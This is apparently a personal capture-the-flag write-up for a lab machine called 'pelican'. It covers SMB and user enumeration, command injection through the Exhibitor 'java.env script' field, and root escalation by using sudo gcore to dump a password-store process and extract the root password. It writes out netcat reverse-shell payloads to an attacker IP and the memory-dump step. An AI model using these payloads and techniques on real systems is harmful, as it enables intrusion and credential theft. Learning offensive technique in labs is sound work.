autorecon 192.168.245.98


Check smb for anonymous shares and enum4linux for potential users. user is `charles`
```
smbclient -L //192.168.245.98/ -N

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            
```

```
enum4linux-ng 192.168.245.98 -A -Gm -R -t 15
[+] Found user 'Unix User\charles' (RID 1000)
```

Go to webpage at `http://192.168.245.98:8080` which redirects us to `http://192.168.245.98:8080/exhibitor/v1/ui/index.html`

ExploitsDB shows an RCE for Exhibitor. 

```
Under the Config tab in the Exhibitor Web UI, the “java.env script” field can be modified and the new configuration pushed to ZooKeeper. Exhibitor launches ZooKeeper through a script, and the contents of this field are passed, unmodified, as arguments to the Java command to launch ZooKeeper, which can be seen here.

(The contents of the “java.env script” field are passed in as $JVMFLAGS.)

Based on how this argument is passed, there are several ways to execute arbitrary commands. The methods tested were surrounding the command with backticks and using $(), for example:

$(/bin/nc -e /bin/sh 10.0.0.64 4444 &)

This example uses netcat to open a reverse shell to a listener on 10.0.0.64:4444.
```

Add the command `$(/bin/nc -e /bin/sh 192.168.45.216 4444 &)` to the java.env script and restart the system. Shell caught on penelope at port 4444.

### Privesc

Run `sudo -l` and realise we have sudo privileges for `/usr/bin/gcore`

Check gtfobins and it says sudo gcore should be use on a processID to read the file. 
```
charles@pelican:~$ ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
...
...
root       513  0.0  0.0   2276    72 ?        Ss   06:37   0:00 /usr/bin/password-store

```

```
charles@pelican:~$ sudo gcore 513
0x00007f971bd1c6f4 in __GI___nanosleep (requested_time=requested_time@entry=0x7ffc3d7a2c80, remaining=remaining@entry=0x7ffc3d7a2c80) at ../sysdeps/unix/sysv/linux/nanosleep.c:28
28      ../sysdeps/unix/sysv/linux/nanosleep.c: No such file or directory.
Saved corefile core.513

charles@pelican:~$ cat core.513 
ELF>@e@8
���G[�U�$�G[�U�4��[�U�D��@@���  ��0�``�0��@��$P��40x=��D�=�  �COREt@@@password-store/usr/bin/password-store PCORE.z=�аG[�U      ��������F��[�Uw������������ ���,z=��,z=�#���3[UF[Ux,z=�+[U��[U[U[U[UCORE�[U�[U�[U�[U�[U�[U�[U�[U[U/usr/bin/passwor���////////////////�)��[UU�)��[U  U�)��[U
U�
LINUX�/usr/bin/passwor���////////////////|�IGISCORE@CORE!�=����d@�G[�U8
                                                                       ��       аG[�U
```

Realised we cannot read the core file output so we use strings from linux.
```
strings core.513 
001 Password: root:
ClogKingpinInning731
```

Obtain `root:ClogKingpinInning731`. su root and obtain flag.